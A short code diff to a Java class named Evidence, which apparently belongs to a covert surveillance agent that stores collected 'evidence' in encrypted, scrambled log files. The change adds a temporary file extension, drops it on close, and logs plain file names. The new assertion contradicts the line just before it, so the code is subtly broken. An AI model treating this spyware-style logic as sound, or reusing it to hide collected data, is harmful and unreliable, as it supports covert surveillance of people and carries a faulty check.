@@ -246,6 +246,8 @@ public final class Evidence {
 	 * @return true, if successful
 	 */
 	public synchronized boolean close() {
+		fconn.dropExtension(EvidenceCollector.LOG_TMP);
+		
 		// TODO: rinominare il file
 		final boolean ret = true;
 		encData = null;
@@ -319,9 +321,9 @@ public final class Evidence {
 			return false;
 		}
 
-		fileName = dir + name.encName;
+		fileName = dir + name.encName + EvidenceCollector.LOG_TMP;
 		Check.asserts(fileName != null, "null fileName");
-		Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_EXTENSION),
+		Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP),
 				"file not scrambled");
 		// Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
 		Log.d(TAG,"createLog fileName:" + fileName);
@@ -333,7 +335,7 @@ public final class Evidence {
 				Log.d(TAG,"FATAL: It should not exist:" + fileName);
 				return false;
 			}
-			Log.d(TAG,"Info: Created: " + fileName);
+			Log.d(TAG,"Info: Created: " + fileName + " plain: " + name.fileName);
 			final byte[] plainBuffer = makeDescription(additionalData,
 					evidenceType);
 			Check.asserts(plainBuffer.length >= 32 + additionalLen,
